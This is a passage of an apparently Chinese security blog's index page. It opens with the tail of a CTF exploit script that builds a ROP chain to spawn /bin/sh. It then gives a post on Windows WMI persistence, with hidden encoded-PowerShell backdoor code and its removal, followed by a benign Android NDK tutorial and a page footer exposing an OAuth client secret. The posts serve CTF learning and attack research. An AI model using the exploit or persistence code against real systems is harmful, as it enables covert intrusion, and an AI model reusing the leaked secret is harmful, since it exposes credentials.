class="keyword">if</span> (x &gt; y):</span><br><span class="line">		x = (x-y)		</span><br><span class="line">		<span class="keyword">print</span> (<span class="string">'fix(-): '</span> + hex(x) , <span class="string">"to "</span> + hex(y))</span><br><span class="line">		write_int(off,x,<span class="string">'-'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">if</span> (y &gt; <span class="number">0x80000000</span>):</span><br><span class="line">			<span class="keyword">print</span> (<span class="string">'fix(*): '</span> + hex(x) , <span class="string">"to "</span> + hex(y))</span><br><span class="line">			n = y / x</span><br><span class="line">			m = y % x</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,n<span class="number">-1</span>):</span><br><span class="line">				write_int(off,x,<span class="string">'+'</span>)</span><br><span class="line">			write_int(off,m,<span class="string">'+'</span>)	</span><br><span class="line">		<span class="keyword">else</span>:			</span><br><span class="line">			x = y - x</span><br><span class="line">			<span class="keyword">print</span> (<span class="string">'fix(+): '</span> + hex(x) , <span class="string">"to "</span> + hex(y))</span><br><span class="line">			write_int(off,x,<span class="string">'+'</span>)</span><br><span class="line">	x = read_int(off)</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">'after: '</span> + hex((x <span class="keyword">if</span> x &gt;=<span class="number">0</span> <span class="keyword">else</span> x+<span class="number">0x100000000</span>)))</span><br><span class="line">	</span><br><span class="line">cookie = <span class="number">357</span></span><br><span class="line">ebp = <span class="number">360</span></span><br><span class="line">ret = <span class="number">361</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	leak_cookie = read_int(cookie)</span><br><span class="line">	leak_ebp= read_int(ebp)</span><br><span class="line">	leak_ret= read_int(ret)</span><br><span class="line">	fleak_ebp = (leak_ebp <span class="keyword">if</span> leak_ebp &gt; <span class="number">0</span> <span class="keyword">else</span> leak_ebp+<span class="number">0x100000000</span>)</span><br><span class="line">	</span><br><span class="line">	binsh = fleak_ebp + <span class="number">0x30</span></span><br><span class="line">	binsh = (binsh <span class="keyword">if</span> binsh &gt; <span class="number">0</span> <span class="keyword">else</span> binsh+<span class="number">0x100000000</span>)</span><br><span class="line">	write_int(<span class="number">380</span>,<span class="number">0x68732F</span>,<span class="string">'+'</span>)</span><br><span class="line">	write_int(<span class="number">379</span>,<span class="number">0x6E69622F</span>,<span class="string">'+'</span>)</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">'binsh'</span> , hex(binsh))</span><br><span class="line"></span><br><span class="line">	set0(ret,pop_eax_ret)</span><br><span class="line">	set0(ret+<span class="number">1</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">	set0(ret+<span class="number">2</span>,pop_ecx2_ret)</span><br><span class="line">	set0(ret+<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	set0(ret+<span class="number">5</span>,pop_ebx2_ret)</span><br><span class="line">	set0(ret+<span class="number">6</span>,binsh)</span><br><span class="line"></span><br><span class="line">	set0(ret+<span class="number">8</span>,pop_edx_ret)</span><br><span class="line">	set0(ret+<span class="number">9</span>,<span class="number">0</span>)</span><br><span class="line">	set0(ret+<span class="number">10</span>,_dl_sysinfo_int80)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'=== Welcome to SECPROG calculator ===\n'</span>)</span><br><span class="line">	pwn()</span><br><span class="line">	p.sendline(<span class="string">""</span>)</span><br><span class="line">	p.sendline(<span class="string">"cat /home/calc/flag"</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/2017/09/20/%E8%81%8A%E4%B8%80%E8%81%8A%E9%9D%9EPE%E5%9C%A8%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7/">谈非PE在攻击中的&#34;持久性&#34;实现</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2017-09-20</span>
                
            </div>
            <div class="post-content">
                
                    <blockquote>
</blockquote>
<p>本文主要探讨针对Windows平台攻击中，如何以非PE方式完成“持久性”后门的实现。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Windows平台下，我们习惯性将与PE可执行文件相对立的“脚本”（通常以源代码文本存储）称之为非PE，例如用Js、Vbs、Powershell、Bat等编写的文件，亦或者是安装有运行时宿主进程环境下的C#、Java、Python、PHP等文件。由于这些非PE文件的类型众多，因而其存在的形式也各种各样，攻击载荷的投递方式也千变万化。一次成功的攻击流程应该是<code>信息收集 -&gt; 渗透攻击 -&gt; 后渗透攻击 -&gt;  结束？</code>其中“渗透攻击”经过一系列的攻击、绕过，从而接近”高价值“目标，在”后渗透攻击“阶段则进行价值挖掘，业务信息窃取等操作，同时为了保证攻击成果的最大化，通常需要保证从攻击方到目标点搭建一个稳定的、持续的通路，也即攻击的”持续性“。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="使用WMI进行驻留"><a href="#使用WMI进行驻留" class="headerlink" title="使用WMI进行驻留"></a>使用WMI进行驻留</h3><p>权限要求:管理员权限<br>下面代码功能为 间隔300s调起powershell执行一次$EncScript功能</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$fname</span> = <span class="string">"XXX Filter"</span></span><br><span class="line"><span class="variable">$cname</span> = <span class="string">"XXX Consumer"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$Query</span> = <span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</span></span><br><span class="line">	<span class="variable">$EncScript</span> = <span class="string">''</span></span><br><span class="line">				</span><br><span class="line">	<span class="variable">$fp</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">		NameSpace = (<span class="string">'root\subscription'</span>)</span><br><span class="line">		<span class="class"><span class="keyword">CLASS</span> = ('__<span class="title">EventFilter</span>')</span></span><br><span class="line"><span class="class">		<span class="title">Arguments</span> = @</span>&#123; Name = <span class="variable">$fname</span></span><br><span class="line">			EventNameSpace = (<span class="string">'root\cimv2'</span>)</span><br><span class="line">			QueryLanguage = (<span class="string">'WQL'</span>)</span><br><span class="line">			Query = <span class="variable">$Query</span></span><br><span class="line">		&#125;</span><br><span class="line">		Erroraction = (<span class="string">'SilentlyContinue'</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$wmif</span> = <span class="built_in">Set-WMIInstance</span> @fp</span><br><span class="line"></span><br><span class="line">	<span class="variable">$cp</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">		NameSpace = (<span class="string">'root\subscription'</span>)</span><br><span class="line">		<span class="class"><span class="keyword">CLASS</span> = ('<span class="title">CommandLineEventConsumer</span>')</span></span><br><span class="line"><span class="class">		<span class="title">Arguments</span> = @</span>&#123;name = <span class="variable">$cname</span> ; CommandlIneteMplate = (<span class="string">'powershell.exe -NoP -NonI -W Hidden -E '</span> + <span class="string">"<span class="variable">$EncScript</span>"</span>) &#125;</span><br><span class="line">		Erroraction = (<span class="string">'SilentlyContinue'</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$wmic</span> = <span class="built_in">Set-WMIInstance</span> @cp</span><br><span class="line">	<span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Namespace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;<span class="keyword">Filter</span>=<span class="variable">$wmif</span>;Consumer=<span class="variable">$wmic</span>&#125; </span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>针对上述后门的清除</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> __EventFilter <span class="literal">-Filter</span> <span class="string">"Name='<span class="variable">$fname</span>'"</span> | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Filter</span> <span class="string">"Name='<span class="variable">$cname</span>'"</span> | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Filter</span> <span class="string">"__Path LIKE '%XXX%'"</span> | <span class="built_in">Remove-WmiObject</span></span><br></pre></td></tr></table></figure>

<p>WMI中存储数据</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$staticclass</span> = <span class="built_in">new-object</span> Management.ManagementClass(<span class="string">'root\default'</span>,<span class="variable">$null</span>,<span class="variable">$null</span>)</span><br><span class="line"><span class="variable">$staticclass</span>.Name = (<span class="string">'Win32_BotTag'</span>)</span><br><span class="line"><span class="variable">$staticclass</span>.put()</span><br><span class="line"></span><br><span class="line"><span class="comment">#存储</span></span><br><span class="line"><span class="variable">$staticclass</span>.properties.Add((<span class="string">'nob'</span>) , <span class="string">' '</span>)</span><br><span class="line"><span class="variable">$staticclass</span>.put()</span><br><span class="line"></span><br><span class="line"><span class="comment">#取出</span></span><br><span class="line">([<span class="type">WmiClass</span>] <span class="string">'root\default:Win32_BotTag'</span>).Properties[<span class="string">'nob'</span>]</span><br></pre></td></tr></table></figure>
<p>鉴于权限要求为管理员权限，一般情况下均需要bypassUAC，接下来聊聊完整性约束和UAC的相关问题。</p>
<h3 id="Windows完整性机制与UAC"><a href="#Windows完整性机制与UAC" class="headerlink" title="Windows完整性机制与UAC"></a>Windows完整性机制与UAC</h3><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>时隔2个月之后，再次来填这个坑已经填不动了，本文的主要内容已经通过文章、演讲的方式与大家分享，具体的链接如下，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Xdef2017议题&lt;非PE攻防之道&gt; http:&#x2F;&#x2F;www.xdef.org.cn&#x2F;xdef2017&#x2F;speakers.html</span><br><span class="line">&lt;No Power No Shell --- 非PE攻击中的套路&gt; https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-221871.htm</span><br></pre></td></tr></table></figure>

<p>–本文完–</p>

                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/2017/03/05/Android%20Studio%20NDK%E9%85%8D%E7%BD%AE/">Android Studio NDK开发配置</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2017-03-05</span>
                
            </div>
            <div class="post-content">
                
                    <p>网上有很多<code>LJ</code>教程，耽误时间不说，真能把人气死，废话不说了，开始<code>Android Studio</code>下<code>NDK</code>开发配置。<br>###1.首先是新建一个android的工程<br>然后新建一个需要用native声明的jni接口类<br>在<code>工程</code>视图下，以<code>app</code>为父节点创建名为<code>jni</code>的文件夹<br><img src="./21-16-17.jpg" alt=""><br>创建<code>JniUtils.java</code>文件，内容如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JniUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> String  <span class="title">getStringFromC</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"JniMain"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要用来加载<code>so</code>库，并且声明native实现的方法</p>
<p>###2.接着，生成jni头文件，这里使用<code>javah</code>命令。<br>先将工程命令行切换到当前工程java文件处<br>输入<code>javah -jni com.cn.yllen.myapplication.JniUtils</code>后回车<br><img src="./21-18-32.jpg" alt=""><br>在该目录下则可以看到<code>com_cn_yllen_myapplication_JniUtils.h</code>文件(包名+文件名称构成)<br>内容为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Header for class com_cn_yllen_myapplication_JniUtils */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _Included_com_cn_yllen_myapplication_JniUtils</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _Included_com_cn_yllen_myapplication_JniUtils</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_cn_yllen_myapplication_JniUtils</span></span><br><span class="line"><span class="comment"> * Method:    getStringFromC</span></span><br><span class="line"><span class="comment"> * Signature: ()Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_cn_yllen_myapplication_JniUtils_getStringFromC</span><br><span class="line">  (JNIEnv *, jclass);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>将其剪切到之前新建的<code>jni</code>文件夹下面，然后新建一个<code>JniUtils.c</code>文件，实现如上方法声明</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_cn_yllen_myapplication_JniUtils.h"</span></span></span><br><span class="line"><span class="function">jstring JNICALL <span class="title">Java_com_cn_yllen_myapplication_JniUtils_getStringFromC</span> <span class="params">(JNIEnv *env, jclass clazz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, <span class="string">"from C say Hello"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>###3.使用<code>ndk-build</code>编译so<br>(需要先下载NDK开发包，然后将其路径设置为系统环境变量path下)<br>继续新建一个<code>Android.mk</code>文件<br>内容为</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Copyright (C) 2009 The Android Open Source Project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Licensed under the Apache License, Version 2.0 (the "License");</span></span><br><span class="line"><span class="comment"># you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"># You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"># distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"># See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"># limitations under the License.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line">LOCAL_MODULE    := JniMain      # 要生成的so文件名称</span><br><span class="line">LOCAL_SRC_FILES := JniUtils.c   # 源码</span><br><span class="line"></span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure>
<p>之后我们用<code>ndk-build</code>命令来编译so文件<br>正常情况下是</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">asproj</span>\<span class="title">MyApplication4</span>\<span class="title">app</span>&gt;<span class="title">ndk</span>-<span class="title">build</span></span></span><br><span class="line"><span class="function">"<span class="title">Compile</span> <span class="title">thumb</span> : <span class="title">JniMain</span> &lt;= <span class="title">JniUtils.c</span></span></span><br><span class="line"><span class="function"><span class="title">SharedLibrary</span>  : <span class="title">libJniMain.so</span></span></span><br><span class="line"><span class="function"><span class="title">Install</span>        : <span class="title">libJniMain.so</span> =&gt; <span class="title">libs</span>/<span class="title">armeabi</span>/<span class="title">libJniMain.so</span></span></span><br></pre></td></tr></table></figure>
<p>但是有可能是这种情况，</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">asproj</span>\<span class="title">MyApplication4</span>\<span class="title">app</span>&gt;<span class="title">ndk</span>-<span class="title">build</span></span></span><br><span class="line"><span class="function">[<span class="title">arm64</span>-<span class="title">v8a</span>] "<span class="title">Compile</span>        ": "<span class="title">JniUtils</span> &lt;= <span class="title">JniUtils.c</span>"</span></span><br><span class="line"><span class="function"><span class="title">process_begin</span>: <span class="title">CreateProcess</span>(<span class="title">NULL</span>, <span class="title">E</span>:/<span class="title">mobileSec</span>/<span class="title">tools</span>/<span class="title">android</span>-<span class="title">sdk_r24</span>.3.4-<span class="title">windows</span>/<span class="title">android</span>-<span class="title">sdk</span>-<span class="title">windows</span>/<span class="title">ndk</span>-<span class="title">bundle</span>/<span class="title">build</span>//../<span class="title">toolchains</span>/<span class="title">llvm</span>/<span class="title">prebuilt</span>/<span class="title">windows</span>-<span class="title">x86_</span></span></span><br><span class="line"><span class="function">64/<span class="title">bin</span>/<span class="title">clang.exe</span> -<span class="title">MMD</span> -<span class="title">MP</span> -<span class="title">MF</span> ./<span class="title">obj</span>/<span class="title">local</span>/<span class="title">arm64</span>-<span class="title">v8a</span>/<span class="title">objs</span>/<span class="title">JniUtils</span>/<span class="title">JniUtils.o.d</span> -<span class="title">gcc</span>-<span class="title">toolchain</span> <span class="title">E</span>:/<span class="title">mobileSec</span>/<span class="title">tools</span>/<span class="title">android</span>-<span class="title">sdk_r24</span>.3.4-<span class="title">windows</span>/<span class="title">android</span>-<span class="title">sdk</span>-<span class="title">windows</span>/<span class="title">n</span></span></span><br><span class="line"><span class="function"><span class="title">dk</span>-<span class="title">bundle</span>/<span class="title">build</span>//../<span class="title">toolchains</span>/<span class="title">aarch64</span>-<span class="title">linux</span>-<span class="title">android</span>-4.9/<span class="title">prebuilt</span>/<span class="title">windows</span>-<span class="title">x86_64</span> -<span class="title">target</span> <span class="title">aarch64</span>-<span class="title">none</span>-<span class="title">linux</span>-<span class="title">android</span> -<span class="title">ffunction</span>-<span class="title">sections</span> -<span class="title">funwind</span>-<span class="title">tables</span> -<span class="title">fstack</span>-</span></span><br><span class="line"><span class="function"><span class="title">protector</span>-<span class="title">strong</span> -<span class="title">fpic</span> -<span class="title">Wno</span>-<span class="title">invalid</span>-<span class="title">command</span>-<span class="title">line</span>-<span class="title">argument</span> -<span class="title">Wno</span>-<span class="title">unused</span>-<span class="title">command</span>-<span class="title">line</span>-<span class="title">argument</span> -<span class="title">no</span>-<span class="title">canonical</span>-<span class="title">prefixes</span> -<span class="title">g</span> -<span class="title">O2</span> -<span class="title">DNDEBUG</span> -<span class="title">Ijni</span> -<span class="title">DANDROID</span> -<span class="title">Wa</span>,--<span class="title">noexecs</span></span></span><br><span class="line"><span class="function"><span class="title">tack</span> -<span class="title">Wformat</span> -<span class="title">Werror</span>=<span class="title">format</span>-<span class="title">security</span> --<span class="title">sysroot</span> <span class="title">E</span>:/<span class="title">mobileSec</span>/<span class="title">tools</span>/<span class="title">android</span>-<span class="title">sdk_r24</span>.3.4-<span class="title">windows</span>/<span class="title">android</span>-<span class="title">sdk</span>-<span class="title">windows</span>/<span class="title">ndk</span>-<span class="title">bundle</span>/<span class="title">build</span>//../<span class="title">platforms</span>/<span class="title">android</span>-21/<span class="title">arc</span></span></span><br><span class="line"><span class="function"><span class="title">h</span>-<span class="title">arm64</span> -<span class="title">c</span> <span class="title">jni</span>/<span class="title">JniUtils.c</span> -<span class="title">o</span> ./<span class="title">obj</span>/<span class="title">local</span>/<span class="title">arm64</span>-<span class="title">v8a</span>/<span class="title">objs</span>/<span class="title">JniUtils</span>/<span class="title">JniUtils.o</span>, ...) <span class="title">failed</span>.</span></span><br><span class="line"><span class="function"><span class="title">make</span> (<span class="title">e</span>=2):</span></span><br><span class="line"><span class="function"><span class="title">make</span>: *** [<span class="title">obj</span>/<span class="title">local</span>/<span class="title">arm64</span>-<span class="title">v8a</span>/<span class="title">objs</span>/<span class="title">JniUtils</span>/<span class="title">JniUtils.o</span>] <span class="title">Error</span> 2</span></span><br></pre></td></tr></table></figure>
<p>这种我也不知道什么问题，我尝试的办法就是，找个<code>短点</code>的路径(如D:\test)，将jni文件夹整个复制过去，然后编译，就可以成功，之后，将生成的<code>libs</code>文件夹拷贝过来就行了。<br>生成libs文件夹下会有<br><img src="./21-33-08.jpg" alt=""><br>为了让studio能将so一同打包到apk中，需要在<code>build.gradle</code>(app)中如下红框内容的添加：<br><img src="./21-34-44.jpg" alt=""><br>至此，so的已经可以随着<code>build</code>一同被打包到apk下’libs’文件夹中了，接着就是要对这个native方法的调用了，<br>###4.使用这个方法<br>我们新建一个按钮，在点击的同时，将native实现的接口返回值用<code>Toast</code>打印出来，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button = (Button) findViewById(R.id.button_1);</span><br><span class="line"></span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>,JniUtils.getStringFromC(),Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>###最后<br>网上虽然有很多各种<code>hello world</code>教程，但是鱼龙混杂，有些是真的坑。<br>通过本文的这些总结，希望之后的人不要再<code>走坑</code>。<br>…. <code>7456</code> &gt;m &lt;``</p>

                
            </div>
        </article>
    
</div>
<div class="paginator">
    
        
        
        <a class="next" href="/page/2/">
            下一页
            <i class="iconfont icon-next"></i>
        </a>
        
    
</div>

    </div>
</div>
<footer class="footer-social">
    
    <a class="social-link" target="_blank" href="https://github.com/y11en">
        <i class="iconfont icon-github"></i>
    </a>
    

    

    

    <div class="footer-copyright">
        <p class="time-line">
            &copy;
            
            
                2015 -
            
            2020
            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
            <a target="_blank" href="https://github.com/iJinxin">y11en</a>
        </p>
        <p class="theme-info">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
        </p>
    </div>
</footer>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script>
    
    var gitment = new Gitment({
        id: '',
        owner: 'y11en',
        repo: 'y11en.github.io',
        oauth: {
            client_id: '5049946d5d3f1d55996d',
            client_secret: 'ebe785ea8e3f9b280d57a372588af2a202f0638c'
        }
    });
    gitment.render('comment-container');
    

</script>
</html>
